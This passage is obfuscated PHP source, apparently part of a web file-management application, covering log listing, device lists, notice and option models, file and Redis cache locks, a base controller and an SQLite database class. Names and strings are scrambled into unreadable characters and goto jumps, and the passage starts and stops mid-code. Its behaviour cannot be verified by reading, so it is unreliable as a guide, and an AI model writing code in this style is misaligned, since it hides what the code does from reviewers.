array($AÛŸÕùÜÖÌ[398] => $AÛŸÕùÜÖÌ[399], $AÛŸÕùÜÖÌ[400] => $AÛŸÕùÜÖÌ[401]); goto eÉéƒğˆÇÒ; cª¦óö§§: return $this->order($d¨”êãéŞÓ); goto BªÉ•¦Œ; eÉéƒğˆÇÒ: $a¦ªéŞ¤« = Input::get($AÛŸÕùÜÖÌ[404], $AÛŸÕùÜÖÌ[7], $AÛŸÕùÜÖÌ[2141], array($AÛŸÕùÜÖÌ[2082], $AÛŸÕùÜÖÌ[400])); $a¦ªéŞ¤« = $FÕÇ×ö¦äÆ[$a¦ªéŞ¤«]; $d¨”êãéŞÓ = $d¨”êãéŞÓ . "{$cÅˆ­©Øã}\40{$a¦ªéŞ¤«}"; goto cª¦óö§§; BªÉ•¦Œ: } public function get($EóÚùµõê = '') { goto B‘ºƒ‹„; F®À´ƒ³ø…: if (!empty($EóÚùµõê[$E‰ˆ›‹‘Ç[2339]])) { $D’ƒĞİŒ¹[$E‰ˆ›‹‘Ç[401]] = array($E‰ˆ›‹‘Ç[747], "\x25{$EóÚùµõê[$E‰ˆ›‹‘Ç[2339]]}\x25"); } $FÁôøµê¦ã = $this->_makeOrder()->where($D’ƒĞİŒ¹)->selectPage(); if (empty($FÁôøµê¦ã[$E‰ˆ›‹‘Ç[350]])) { show_json(array(), !0, $FÁôøµê¦ã[$E‰ˆ›‹‘Ç[347]]); } goto BÂ‘çã¼ã; DáÊ¨ƒæ²: if ($EóÚùµõê[$E‰ˆ›‹‘Ç[1341]]) { $D’ƒĞİŒ¹[$E‰ˆ›‹‘Ç[1341]] = $EóÚùµõê[$E‰ˆ›‹‘Ç[1341]]; } if (isset($EóÚùµõê[$E‰ˆ›‹‘Ç[688]])) { $a ë‘Ï˜» = $EóÚùµõê[$E‰ˆ›‹‘Ç[688]]; $e»ªØÌ†åƒ = isset($EóÚùµõê[$E‰ˆ›‹‘Ç[689]]) ? $EóÚùµõê[$E‰ˆ›‹‘Ç[689]] : time(); $D’ƒĞİŒ¹[$E‰ˆ›‹‘Ç[184]] = array($E‰ˆ›‹‘Ç[318], array($a ë‘Ï˜», $e»ªØÌ†åƒ)); } if ($EóÚùµõê[$E‰ˆ›‹‘Ç[29]]) { $fÊƒ‰ÙÌÀÂ = explode($E‰ˆ›‹‘Ç[47], $EóÚùµõê[$E‰ˆ›‹‘Ç[29]]); $d’¹‚—…Å = $this->typeFile(); $Dß’˜ºñ½Š = array(); foreach ($fÊƒ‰ÙÌÀÂ as $DŒŠ·ƒíÎµ) { $Dß’˜ºñ½Š[] = $DŒŠ·ƒíÎµ; if (isset($d’¹‚—…Å[$DŒŠ·ƒíÎµ])) { $Dß’˜ºñ½Š = array_merge($Dß’˜ºñ½Š, $d’¹‚—…Å[$DŒŠ·ƒíÎµ]); } } $Dß’˜ºñ½Š = array_unique($Dß’˜ºñ½Š); if ($Dß’˜ºñ½Š) { $D’ƒĞİŒ¹[$E‰ˆ›‹‘Ç[29]] = array($E‰ˆ›‹‘Ç[7], $Dß’˜ºñ½Š); } } goto F®À´ƒ³ø…; B‘ºƒ‹„: $E‰ˆ›‹‘Ç =& $_SERVER[÷ÖêïÔÔÓ]; if (!$EóÚùµõê) { show_json(array()); } $D’ƒĞİŒ¹ = array(); goto DáÊ¨ƒæ²; BÂ‘çã¼ã: $FÁôøµê¦ã[$E‰ˆ›‹‘Ç[350]] = $this->logList($FÁôøµê¦ã[$E‰ˆ›‹‘Ç[350]]); return $FÁôøµê¦ã; goto D–²ñ¿šî; D–²ñ¿šî: } private function ipAddress(&$Aİç ƒš˜) { $dßŠô¼ŞƒÀ =& $_SERVER[÷ÖêïÔÔÓ]; if (!empty($Aİç ƒš˜[$dßŠô¼ŞƒÀ[2339]])) { $B½º…Üçé¹ = IpLocation::get($Aİç ƒš˜[$dßŠô¼ŞƒÀ[2339]]); if ($B½º…Üçé¹ == $dßŠô¼ŞƒÀ[2340]) { $B½º…Üçé¹ = $dßŠô¼ŞƒÀ[2341]; } } else { $B½º…Üçé¹ = LNG($dßŠô¼ŞƒÀ[2342]); } $Aİç ƒš˜[$dßŠô¼ŞƒÀ[2343]] = $B½º…Üçé¹; } private function getSourceList(&$C¿ÙÜøù¯) { $eèµÒŒ‹ =& $_SERVER[÷ÖêïÔÔÓ]; $bäÏŠ½ì–‚ = array(); foreach ($C¿ÙÜøù¯ as $F´äğöïåˆ => $eš»¤‘‘Ú) { $D«éÓÂ…Ë = json_decode($eš»¤‘‘Ú[$eèµÒŒ‹[401]], !0); if (strpos($eš»¤‘‘Ú[$eèµÒŒ‹[29]], $eèµÒŒ‹[2176]) !== 0) { goto f«Œó÷ˆÕ; bŸÆÓïë›: $bäÏŠ½ì–‚[] = $D«éÓÂ…Ë[$eèµÒŒ‹[366]] = $Aê¾ÁËâ°Á[$eèµÒŒ‹[366]]; $bäÏŠ½ì–‚[] = $D«éÓÂ…Ë[$eèµÒŒ‹[2175]] = $Aê¾ÁËâ°Á[$eèµÒŒ‹[457]]; $C¿ÙÜøù¯[$F´äğöïåˆ][$eèµÒŒ‹[401]] = json_encode($D«éÓÂ…Ë); goto D³¦—Ù²Õ; f«Œó÷ˆÕ: if (!isset($D«éÓÂ…Ë[$eèµÒŒ‹[76]]) || strpos($eš»¤‘‘Ú[$eèµÒŒ‹[29]], $eèµÒŒ‹[2344]) !== 0) { continue; } if (!IO::init($D«éÓÂ…Ë[$eèµÒŒ‹[76]])) { continue; } if (!($Aê¾ÁËâ°Á = IO::infoFull($D«éÓÂ…Ë[$eèµÒŒ‹[76]]))) { continue; } goto bŸÆÓïë›; D³¦—Ù²Õ: continue; goto f“ñ†±ß²; f“ñ†±ß²: } $bäÏŠ½ì–‚[] = $D«éÓÂ…Ë[$eèµÒŒ‹[366]]; $bäÏŠ½ì–‚[] = $D«éÓÂ…Ë[$eèµÒŒ‹[2175]]; if ($D«éÓÂ…Ë[$eèµÒŒ‹[29]] == $eèµÒŒ‹[484]) { $bäÏŠ½ì–‚[] = $D«éÓÂ…Ë[$eèµÒŒ‹[401]][$eèµÒŒ‹[979]]; $bäÏŠ½ì–‚[] = $D«éÓÂ…Ë[$eèµÒŒ‹[401]][$eèµÒŒ‹[980]]; } if ($D«éÓÂ…Ë[$eèµÒŒ‹[29]] == $eèµÒŒ‹[2183]) { $bäÏŠ½ì–‚[] = $D«éÓÂ…Ë[$eèµÒŒ‹[401]][$eèµÒŒ‹[366]]; } } if (!$bäÏŠ½ì–‚) { return array(); } return Model($eèµÒŒ‹[748])->sourceListInfo($bäÏŠ½ì–‚, !0); } private function logList($AœÑ—‘ëµ) { goto aõ’œùÖ•ù; dÓÎ˜±¢: return $aÀ¸××«Á°; goto AÈ—ÚŒ¹; b‹´¨Ïª: $F„¥ôëßà¦ = array(); foreach ($AœÑ—‘ëµ as $fá‹¬…Ù‘‡ => $c‹Ã§àËø) { goto D¸ìÏ·Ï„Ä; D¸ìÏ·Ï„Ä: $f¬‹Ìê§é… = $c‹Ã§àËø[$FÊ¯ÃèŠ¨[29]]; $cÌÌ˜¯Ç = isset($aï¢ÖîÏó[$c‹Ã§àËø[$FÊ¯ÃèŠ¨[1341]]]) ? $aï¢ÖîÏó[$c‹Ã§àËø[$FÊ¯ÃèŠ¨[1341]]] : !1; $aíóà‚™Ú = strpos($f¬‹Ìê§é…, $FÊ¯ÃèŠ¨[2345]) == 0 ? LNG($FÊ¯ÃèŠ¨[2346]) : LNG($FÊ¯ÃèŠ¨[2342]); goto dÁíØôÇ¾; b„Ü¹·Œ´: unset($c‹Ã§àËø[$FÊ¯ÃèŠ¨[2347]]); $aÀ¸××«Á°[] = $c‹Ã§àËø; goto AŠœ®¬„‰; dÁíØôÇ¾: $c‹Ã§àËø[$FÊ¯ÃèŠ¨[28]] = isset($cÌÌ˜¯Ç[$FÊ¯ÃèŠ¨[28]]) ? $cÌÌ˜¯Ç[$FÊ¯ÃèŠ¨[28]] : LNG($FÊ¯ÃèŠ¨[2342]); $c‹Ã§àËø[$FÊ¯ÃèŠ¨[2224]] = isset($cÌÌ˜¯Ç[$FÊ¯ÃèŠ¨[2224]]) ? $cÌÌ˜¯Ç[$FÊ¯ÃèŠ¨[2224]] : $FÊ¯ÃèŠ¨[33]; $c‹Ã§àËø[$FÊ¯ÃèŠ¨[1237]] = isset($fêÌ¿áä‰Ñ[$f¬‹Ìê§é…]) ? $fêÌ¿áä‰Ñ[$f¬‹Ìê§é…] : $aíóà‚™Ú; goto EÖó£»ä; eÈ¹ô—ŒÜ: $this->ipAddress($c‹Ã§àËø); if (strpos($f¬‹Ìê§é…, $FÊ¯ÃèŠ¨[2176]) === 0 || isset($aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2175]])) { goto bˆÒÚ›·†; e§Éà†ë‰©: if ($aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2188]] && $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2188]][$FÊ¯ÃèŠ¨[368]] == $FÊ¯ÃèŠ¨[1049]) { $F„¥ôëßà¦[] = $c‹Ã§àËø[$FÊ¯ÃèŠ¨[364]]; unset($AœÑ—‘ëµ[$fá‹¬…Ù‘‡]); continue; } goto aèØ½‡÷ë»; DÒ±¡ğİ¦: if ($aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[29]] == $FÊ¯ÃèŠ¨[2183]) { $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[401]][$FÊ¯ÃèŠ¨[366]] = $b­É‹äÈÂù[$aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[401]][$FÊ¯ÃèŠ¨[366]]]; } if ($aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[29]] == $FÊ¯ÃèŠ¨[1972]) { $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2188]] = $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[388]]; $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2175]] = $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2188]][$FÊ¯ÃèŠ¨[366]]; $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[388]] = !1; $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[366]] = $FÊ¯ÃèŠ¨[33]; } if ($aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[388]] && $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[388]][$FÊ¯ÃèŠ¨[368]] == $FÊ¯ÃèŠ¨[1049]) { $F„¥ôëßà¦[] = $c‹Ã§àËø[$FÊ¯ÃèŠ¨[364]]; unset($AœÑ—‘ëµ[$fá‹¬…Ù‘‡]); continue; } goto e§Éà†ë‰©; bˆÒÚ›·†: $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[388]] = $b­É‹äÈÂù[$aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[366]]]; $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2188]] = $b­É‹äÈÂù[$aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2175]]]; if ($aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[29]] == $FÊ¯ÃèŠ¨[484]) { $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[401]][$FÊ¯ÃèŠ¨[979]] = $b­É‹äÈÂù[$aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[401]][$FÊ¯ÃèŠ¨[979]]]; $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[401]][$FÊ¯ÃèŠ¨[980]] = $b­É‹äÈÂù[$aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[401]][$FÊ¯ÃèŠ¨[980]]]; } goto DÒ±¡ğİ¦; aèØ½‡÷ë»: } $c‹Ã§àËø[$FÊ¯ÃèŠ¨[401]] = $aí¼óÁ©¹á; goto b„Ü¹·Œ´; EÖó£»ä: $c‹Ã§àËø[$FÊ¯ÃèŠ¨[2140]] = $cÌÌ˜¯Ç; $aí¼óÁ©¹á = json_decode($c‹Ã§àËø[$FÊ¯ÃèŠ¨[401]], !0); $c‹Ã§àËø[$FÊ¯ÃèŠ¨[2339]] = isset($aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2339]]) ? $aí¼óÁ©¹á[$FÊ¯ÃèŠ¨[2339]] : $FÊ¯ÃèŠ¨[33]; goto eÈ¹ô—ŒÜ; AŠœ®¬„‰: } $this->clearSystemPathLog($F„¥ôëßà¦); goto dÓÎ˜±¢; D×å¥ŠŠ“¥: $b­É‹äÈÂù = $this->getSourceList($AœÑ—‘ëµ); $fêÌ¿áä‰Ñ = $this->typeAll(); $aÀ¸××«Á° = array(); goto b‹´¨Ïª; aõ’œùÖ•ù: $FÊ¯ÃèŠ¨ =& $_SERVER[÷ÖêïÔÔÓ]; $cõ¤ÂÓ„Œ = array_to_keyvalue($AœÑ—‘ëµ, $FÊ¯ÃèŠ¨[33], $FÊ¯ÃèŠ¨[1341]); $aï¢ÖîÏó = Model($FÊ¯ÃèŠ¨[469])->userListInfo(array_unique($cõ¤ÂÓ„Œ)); goto D×å¥ŠŠ“¥; AÈ—ÚŒ¹: } private function clearSystemPathLog($fœªËÍ–é) { $BƒÏİ†‘® =& $_SERVER[÷ÖêïÔÔÓ]; if (count($fœªËÍ–é) == 0) { return; } $cÃõ¶ºæ“Ÿ = array($BƒÏİ†‘®[364] => array($BƒÏİ†‘®[7], array_unique($fœªËÍ–é))); $this->where($cÃõ¶ºæ“Ÿ)->delete(); } public function deviceList($c†ğ‡…Ûµ, $Aºì•š»å = null) { goto E“ù–’ŞİÏ; bØÉÈˆÛË: $eŠë”½¼ºš = $this->where($a•¦›Š)->order($B‘à·§ÖÈ‹[2186])->select(); $få‘œ¨…æ˜ = array(); foreach ($eŠë”½¼ºš as $eŒ„ª‰¥©Š => &$b‘˜õÉÓ‰) { goto Eæ±ÄÇƒ¡Ñ; Fƒœ®Ô«¹: $b‘˜õÉÓ‰[$B‘à·§ÖÈ‹[401]] = $Bí³İ¬á; $få‘œ¨…æ˜[$cî—ª©ÏÆ”] = $b‘˜õÉÓ‰; goto BñõÏ¢•¿¢; c™¾¡„Ä„: $cî—ª©ÏÆ” = md5(json_encode($Bí³İ¬á)); if (isset($få‘œ¨…æ˜[$cî—ª©ÏÆ”])) { unset($eŠë”½¼ºš[$eŒ„ª‰¥©Š]); continue; } $this->ipAddress($b‘˜õÉÓ‰); goto Fƒœ®Ô«¹; Eæ±ÄÇƒ¡Ñ: $Bí³İ¬á = json_decode($b‘˜õÉÓ‰[$B‘à·§ÖÈ‹[401]], !0); $b‘˜õÉÓ‰[$B‘à·§ÖÈ‹[2339]] = isset($Bí³İ¬á[$B‘à·§ÖÈ‹[2339]]) ? $Bí³İ¬á[$B‘à·§ÖÈ‹[2339]] : $B‘à·§ÖÈ‹[33]; unset($Bí³İ¬á[$B‘à·§ÖÈ‹[2339]]); goto c™¾¡„Ä„; BñõÏ¢•¿¢: } goto dê§çĞ¸İ¯; dê§çĞ¸İ¯: return array_values($få‘œ¨…æ˜); goto eºÓŠê¡Øê; E“ù–’ŞİÏ: $B‘à·§ÖÈ‹ =& $_SERVER[÷ÖêïÔÔÓ]; $a•¦›Š = array($B‘à·§ÖÈ‹[1341] => $c†ğ‡…Ûµ, $B‘à·§ÖÈ‹[29] => $B‘à·§ÖÈ‹[1945]); if ($Aºì•š»å) { $a•¦›Š[$B‘à·§ÖÈ‹[184]] = array($B‘à·§ÖÈ‹[924], $Aºì•š»å); } goto bØÉÈˆÛË; eºÓŠê¡Øê: } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x6e\x6f\164\x69\143\x65\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x63\157\x6e\x74\145\x6e\164", "\141\165\164\150", "\155\157\x64\145", "\x74\151\x6d\145", "\164\171\160\145", "\163\157\x72\164"); public function listData($cæ­„íà = false, $bÍä±÷óõ¢ = "\163\157\162\164", $E¿‹ƒ ¯ù = false) { return parent::listData($cæ­„íà, $bÍä±÷óõ¢, $E¿‹ƒ ¯ù); } public function add($bİ£µÚ•÷Š) { goto cË¢«ì˜»®; e£ÃÇ„ËôÖ: return parent::insert($bİ£µÚ•÷Š); goto Eéâä”§æ©; cË¢«ì˜»®: $aÔŠÃäè =& $_SERVER[÷ÖêïÔÔÓ]; $dğŞ”‡ÖÌ = $this->findByName($bİ£µÚ•÷Š[$aÔŠÃäè[28]]); if ($dğŞ”‡ÖÌ) { return !1; } goto BÔ÷áê¹Áñ; BÔ÷áê¹Áñ: $fÉŞòà²¨ = time(); if ($bİ£µÚ•÷Š[$aÔŠÃäè[12]] == $aÔŠÃäè[2348]) { $fÉŞòà²¨ = strtotime($bİ£µÚ•÷Š[$aÔŠÃäè[187]]); } $bİ£µÚ•÷Š[$aÔŠÃäè[187]] = $fÉŞòà²¨; goto e£ÃÇ„ËôÖ; Eéâä”§æ©: } public function update($cÇ¼àğÜƒ·, $d˜ç§éêÁª) { goto Dò“»˜ºß; aíøËÚŸˆÑ: $d˜ç§éêÁª[$f†ôÉë¦å²[187]] = $f¤Â‡¬¤ƒ; return parent::update($cÇ¼àğÜƒ·, $d˜ç§éêÁª); goto DÀÌéØ÷Ù; Dò“»˜ºß: $f†ôÉë¦å² =& $_SERVER[÷ÖêïÔÔÓ]; $C¬ƒˆª‘í“ = $this->listData($cÇ¼àğÜƒ·); $D½ùîç“í = $this->findByName($d˜ç§éêÁª[$f†ôÉë¦å²[28]]); goto Bğ®‘†Â‰; Bğ®‘†Â‰: if (!$C¬ƒˆª‘í“ || $D½ùîç“í && $D½ùîç“í[$f†ôÉë¦å²[364]] != $C¬ƒˆª‘í“[$f†ôÉë¦å²[364]]) { return !1; } $f¤Â‡¬¤ƒ = time(); if ($d˜ç§éêÁª[$f†ôÉë¦å²[12]] == $f†ôÉë¦å²[2348]) { $f¤Â‡¬¤ƒ = strtotime($d˜ç§éêÁª[$f†ôÉë¦å²[187]]); } goto aíøËÚŸˆÑ; DÀÌéØ÷Ù: } public function remove($fÜÖ„É•˜É) { $Eµ•¯ê…Í = $this->listData($fÜÖ„É•˜É); if (!$Eµ•¯ê…Í || $Eµ•¯ê…Í[$_SERVER[÷ÖêïÔÔÓ][1049]]) { return !1; } return parent::remove($fÜÖ„É•˜É); } public function sort($eñŠ¼Î”÷Ó, $d°ãÁ×Î½) { return parent::update($eñŠ¼Î”÷Ó, $d°ãÁ×Î½); } private function initUserOption() { $Aˆİº·˜¸Ë =& $_SERVER[÷ÖêïÔÔÓ]; $this->optionType = $Aˆİº·˜¸Ë[2349]; $this->modelType = $Aˆİº·˜¸Ë[2350]; $this->field = array($Aˆİº·˜¸Ë[2351], $Aˆİº·˜¸Ë[28], $Aˆİº·˜¸Ë[187], $Aˆİº·˜¸Ë[29], $Aˆİº·˜¸Ë[675], $Aˆİº·˜¸Ë[180]); } public function userNoticeGet($d¥³îÙéôÍ = false) { $this->initUserOption(); return parent::listData($d¥³îÙéôÍ, $_SERVER[÷ÖêïÔÔÓ][364], !0); } public function userNoticeAdd($EÒÏ©§Ì) { $bƒ‡ğ¡ãÉ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initUserOption(); $ağ˜‡é†Œ = $this->findByKey($bƒ‡ğ¡ãÉ[2351], $EÒÏ©§Ì[$bƒ‡ğ¡ãÉ[364]]); if ($ağ˜‡é†Œ) { return !0; } $f¹Ïƒõ’àÛ = array($bƒ‡ğ¡ãÉ[2351] => $EÒÏ©§Ì[$bƒ‡ğ¡ãÉ[364]], $bƒ‡ğ¡ãÉ[28] => $EÒÏ©§Ì[$bƒ‡ğ¡ãÉ[28]], $bƒ‡ğ¡ãÉ[187] => $EÒÏ©§Ì[$bƒ‡ğ¡ãÉ[187]], $bƒ‡ğ¡ãÉ[29] => isset($EÒÏ©§Ì[$bƒ‡ğ¡ãÉ[29]]) ? $EÒÏ©§Ì[$bƒ‡ğ¡ãÉ[29]] : 1, $bƒ‡ğ¡ãÉ[675] => 0, $bƒ‡ğ¡ãÉ[180] => 0); return parent::insert($f¹Ïƒõ’àÛ); } public function userNoticeEdit($AÌŠ¥ãâÆ, $dÚëÚÇè±¤) { $this->initUserOption(); return parent::update($AÌŠ¥ãâÆ, $dÚëÚÇè±¤); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\x6d\137\x6f\160\x74\x69\157\156"; protected $jsonField = array("\x6d\x65\156\x75", "\162\x6f\154\145", "\162\x6f\154\x65\x47\x72\x6f\x75\x70", "\x72\x65\x67\x69\163\164", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($A’¸ÛÕÄ³) { return "\x53\171\x73\164\x65\155\x4f\x70\164\x69\x6f\156\137{$A’¸ÛÕÄ³}"; } } goto d¬ÕõÏ£; E»ÑİóÄ: define($_SERVER[÷ÖêïÔÔÓ][1833], 1); define($_SERVER[÷ÖêïÔÔÓ][1834], 2); define($_SERVER[÷ÖêïÔÔÓ][1835], 3); goto FåìŠ·ÏÚ; e…§Úñ£Í: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $AØˆƒé™’Õ =& $_SERVER[÷ÖêïÔÔÓ]; $F•Øñ´¿Ó = $GLOBALS[$AØˆƒé™’Õ[6]][$AØˆƒé™’Õ[334]]; self::$cachePath = $F•Øñ´¿Ó[$AØˆƒé™’Õ[164]][$AØˆƒé™’Õ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($føÒéƒËÍ˜, $B„§ºö¦ƒ« = 0) { goto FôÕ‹ßÁóô; AÃÚƒœ¢²÷: $bÚÊÓê‰ßİ = rtrim(self::$cachePath, $aŠÀªÍèï­[8]) . $aŠÀªÍèï­[767] . md5($føÒéƒËÍ˜) . $aŠÀªÍèï­[768]; if (file_exists($bÚÊÓê‰ßİ) && filemtime($bÚÊÓê‰ßİ) && filemtime($bÚÊÓê‰ßİ) < time() - 10) { @unlink($bÚÊÓê‰ßİ); } do { if (file_exists($bÚÊÓê‰ßİ)) { cacheLockWait(); continue; } $CïàÄ»Ëƒí = fopen($bÚÊÓê‰ßİ, $aŠÀªÍèï­[769]); if (!$CïàÄ»Ëƒí) { return !1; } $bòáÀÍ…˜æ = flock($CïàÄ»Ëƒí, LOCK_EX | LOCK_NB); self::$caches[$føÒéƒËÍ˜] = array($aŠÀªÍèï­[770] => $CïàÄ»Ëƒí, $aŠÀªÍèï­[164] => $bÚÊÓê‰ßİ); fwrite($CïàÄ»Ëƒí, $aÊŸÃã¥Œö); clearstatcache(); if ($CïàÄ»Ëƒí && $bòáÀÍ…˜æ) { return !0; } cacheLockWait(); } while (microtime(!0) < $aÊŸÃã¥Œö); goto DÄâ…‘‡¬Ù; FôÕ‹ßÁóô: $aŠÀªÍèï­ =& $_SERVER[÷ÖêïÔÔÓ]; $FĞÔØƒÇÆô = microtime(!0); $aÊŸÃã¥Œö = $FĞÔØƒÇÆô + $B„§ºö¦ƒ« + 0.0001; goto AÃÚƒœ¢²÷; DÄâ…‘‡¬Ù: $this->unlock($føÒéƒËÍ˜); return !1; goto D»ÂŸ‹®‹Á; D»ÂŸ‹®‹Á: } public function lockGet($DØšÍ‘Í°À) { $aŒ™·šà¥“ =& $_SERVER[÷ÖêïÔÔÓ]; $AÁ“½†‡ = rtrim(self::$cachePath, $aŒ™·šà¥“[8]) . $aŒ™·šà¥“[767] . md5($DØšÍ‘Í°À) . $aŒ™·šà¥“[768]; return file_exists($AÁ“½†‡); } public function unlock($AŒìì§‘à›) { goto cæ±¸©Ï; A‹·–™¶Û: unset(self::$caches[$AŒìì§‘à›]); goto aÃì«›­ºš; F©ÓÄ¤´‹: @flock($fÌ·– ¡[$D˜Ù÷±î¿[770]], LOCK_UN); @fclose($fÌ·– ¡[$D˜Ù÷±î¿[770]]); @unlink($fÌ·– ¡[$D˜Ù÷±î¿[164]]); goto A‹·–™¶Û; cæ±¸©Ï: $D˜Ù÷±î¿ =& $_SERVER[÷ÖêïÔÔÓ]; $fÌ·– ¡ = self::$caches[$AŒìì§‘à›]; if (!$fÌ·– ¡) { return; } goto F©ÓÄ¤´‹; aÃì«›­ºš: } } class CacheLockRedis { public function lock($f‰¥¶“ä, $Cù›¯ëÒ£¾ = 10) { $aÀò²ÇĞŸ = Cache::init(); $f¢î‹»Ã¥³ = microtime(!0) + $Cù›¯ëÒ£¾; while (microtime(!0) < $f¢î‹»Ã¥³) { $bÊãÈÒî½‡ = $aÀò²ÇĞŸ->get($f‰¥¶“ä); if (!$bÊãÈÒî½‡) { $b“ÇÏÔÏ‹ = $aÀò²ÇĞŸ->setLock($f‰¥¶“ä, $f¢î‹»Ã¥³, $Cù›¯ëÒ£¾); if ($b“ÇÏÔÏ‹) { return !0; } } else { if ($bÊãÈÒî½‡ < microtime(!0)) { $aÀò²ÇĞŸ->set($f‰¥¶“ä, $f¢î‹»Ã¥³, $f¢î‹»Ã¥³); if ($aÀò²ÇĞŸ->get($f‰¥¶“ä) === $bÊãÈÒî½‡) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($A¡õ„ç«Ã) { return Cache::init()->get($A¡õ„ç«Ã); } public function unlock($fÊ†˜óªÊ) { return Cache::init()->remove($fÊ†˜óªÊ); } } goto däËÊ«Ş; A íè³®™Á: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e‘êÉ–£À; C›‹¶Àê: $this->tpl = TEMPLATE . MOD . $d¹·ï‰ ë[8]; $this->_classObjectID = mt_rand(0, 10000); goto FÆ°–Ğ‰º¶; e‘êÉ–£À: $d¹·ï‰ ë =& $_SERVER[÷ÖêïÔÔÓ]; global $in, $config; $this->config =& $config; goto c À¯´çğì; c À¯´çğì: $this->in =& $in; $this->values[$d¹·ï‰ ë[6]] =& $config; $this->values[$d¹·ï‰ ë[7]] =& $in; goto C›‹¶Àê; FÆ°–Ğ‰º¶: } public function loadClass($c”Â¬‹•´) { if (1 === func_num_args()) { $this->{$c”Â¬‹•´} = new $c”Â¬‹•´(); } else { $A˜¸Ñ„õŸ‹ = new ReflectionClass($c”Â¬‹•´); $EëÂÄÒÀ÷¤ = func_get_args(); array_shift($EëÂÄÒÀ÷¤); $this->{$c”Â¬‹•´} = $A˜¸Ñ„õŸ‹->newInstanceArgs($EëÂÄÒÀ÷¤); } return $this->{$c”Â¬‹•´}; } protected function assign($c°£„Ş¨‰, $E‰Äˆ¯—¬×) { $this->values[$c°£„Ş¨‰] = $E‰Äˆ¯—¬×; } protected function display($D»´»­µ«) { ob_end_clean(); extract($this->values); require $this->tpl . $D»´»­µ«; } } class DbSqliteBase extends Db { public function __construct($bé×™‹ÆÚí = '') { $FÛ¾ÊøíªÜ =& $_SERVER[÷ÖêïÔÔÓ]; if (!extension_loaded($FÛ¾ÊøíªÜ[9])) { think_exception(think_lang($FÛ¾ÊøíªÜ[10]) . $FÛ¾ÊøíªÜ[11]); } if (!empty($bé×™‹ÆÚí)) { if (!isset($bé×™‹ÆÚí[$FÛ¾ÊøíªÜ[12]])) { $bé×™‹ÆÚí[$FÛ¾ÊøíªÜ[12]] = 438; } $this->config = $bé×™‹ÆÚí; if (empty($this->config[$FÛ¾ÊøíªÜ[13]])) { $this->config[$FÛ¾ÊøíªÜ[13]] = array(); } } } public function connect($bƒ§İ„¾¤ = '', $Bƒ„Ä‹¨ÒŠ = 0) { $b«½œŒÑ° =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($this->linkID[$Bƒ„Ä‹¨ÒŠ])) { goto E²ÊÑ•÷ Ò; A¯§èËÀµÀ: $this->linkID[$Bƒ„Ä‹¨ÒŠ] = $Bß‘Á°ÓŠ($bƒ§İ„¾¤[$b«½œŒÑ°[17]], $bƒ§İ„¾¤[$b«½œŒÑ°[12]]); if (!$this->linkID[$Bƒ„Ä‹¨ÒŠ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto aÎÕÁõóŠ; aÎÕÁõóŠ: @sqlite_busy_timeout($this->linkID[$Bƒ„Ä‹¨ÒŠ], 30000); if (1 != think_config($b«½œŒÑ°[18])) { unset($this->config); } goto fïÔåãĞë¥; E²ÊÑ•÷ Ò: if (empty($bƒ§İ„¾¤)) { $bƒ§İ„¾¤ = $this->config; } $A¨Ú†®£Ï¹ = !empty($bƒ§İ„¾¤[$b«½œŒÑ°[13]][$b«½œŒÑ°[14]]) ? $bƒ§İ„¾¤[$b«½œŒÑ°[13]][$b«½œŒÑ°[14]] : $this->pconnect; $Bß‘Á°ÓŠ = $A¨Ú†®£Ï¹ ? $b«½œŒÑ°[15] : $b«½œŒÑ°[16]; goto A¯§èËÀµÀ; fïÔåãĞë¥: } return $this->linkID[$Bƒ„Ä‹¨ÒŠ]; } public function free() { $this->queryID = null; } public function query($d¶¼ôİàÚ×) { goto Eí£¸¥©è; E‡ò‚³±¢›: $this->queryStr = $d¶¼ôİàÚ×; if ($this->queryID) { $this->free(); } think_action_status($a‡éâŞ‹Ş[19], 1); goto fâõ¹íâ„; Eí£¸¥©è: $a‡éâŞ‹Ş =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E‡ò‚³±¢›; fâõ¹íâ„: think_status($a‡éâŞ‹Ş[20]); $this->queryID = sqlite_query($this->_linkID, $d¶¼ôİàÚ×); $this->debug(); goto EÈçŒ—Í„æ; EÈçŒ—Í„æ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $AŸ¤‚’Œ = $this->getAll(); return $AŸ¤‚’Œ; } goto D‰Ù‘Â±Àë; D‰Ù‘Â±Àë: } public function execute($EáæÍñïˆê) { goto bÆ´¢° Â ; f ÄÕĞ­ßØ: 